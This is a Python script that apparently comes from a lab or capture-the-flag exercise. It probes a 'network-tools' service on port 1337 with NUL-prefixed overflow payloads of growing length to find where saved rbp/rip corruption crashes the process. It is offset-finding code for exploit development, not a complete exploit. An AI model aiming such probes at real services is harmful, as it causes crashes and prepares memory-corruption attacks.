{"content": "#!/usr/bin/env python3
"""Search the payload length at which a NUL-prefixed overflow first kills the process.
Payload shape: b'\\x00' + b'A'*(L-1) + b'\\n'  -> count=0 so split_at(0) never panics;
any death is then caused by corrupting the frame (saved rbp/rip)."""
import socket, time, sys

HOST, PORT = 'network-tools', 1337
OUT = []

def w(s):
    print(s); OUT.append(s)

def conn():
    s = socket.create_connection((HOST, PORT), 8); s.settimeout(2.0); return s

def drain(s, total=2.5):
    buf = b''; end = time.time() + total; closed = False
    while time.time() < end:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        except ConnectionResetError:
            closed = 'RST'; break
        if not c:
            closed = True; break
        buf += c
    return buf, closed

def probe(payload, no_newline=False):
    """returns (result, detail)"""
    s = conn()
    res = '?'
    try:
        time.sleep(0.15)
        drain(s, 1.5)
        s.sendall(b'3\n')
        p, _ = drain(s, 1.5)
        if b'Hostname' not in p:
            return 'BADPROMPT', repr(p)
        s.sendall(payload)
        if not no_newline:
            s.sendall(b'\n')
        d, closed = drain(s, 3.0)
        if b'Invalid domain name!' in d or b'[' in d:
            if b'> ' in d or b'1. ping' in d:
                res = 'OK_MENU'
            else:
                res = 'OUTPUT_NOMENU'
        elif closed:
            res = 'CLOSED_NOOUTPUT'
        elif d == b'':
            res = 'SILENT_OPEN'
        else:
            res = 'OTHER'
        return res, repr(d[-90:]) + ' closed=%r' % (closed,)
    finally:
        try: s.close()
        except Exception: pass

def alive():
    try:
        s = conn(); d, _ = drain(s, 1.5); s.close()
        return b'leaked' in d
    except Exception:
        return False

def run(L, no_newline=False):
    payload = b'\x00' + b'A' * (L - 1) + (b'' if no_newline else b'\n')
    if no_newline:
        payload = b'\x00' + b'A' * (L - 1)
    r, detail = probe(payload, no_newline)
    a = alive()
    w('L=%-5d total_sent=%-5d -> %-16s detail=%s  service_alive=%s' % (L, len(payload), r, detail, a))
    return r

if __name__ == '__main__':
    lengths = [int(x) for x in sys.argv[1].split(',')] if len(sys.argv) > 1 else [430, 431, 432, 433, 440]
    nn = len(sys.argv) > 2 and sys.argv[2] == 'nn'
    for L in lengths:
        run(L, nn)
    open('/tmp/scan.out', 'a').write('\n'.join(OUT) + '\n')
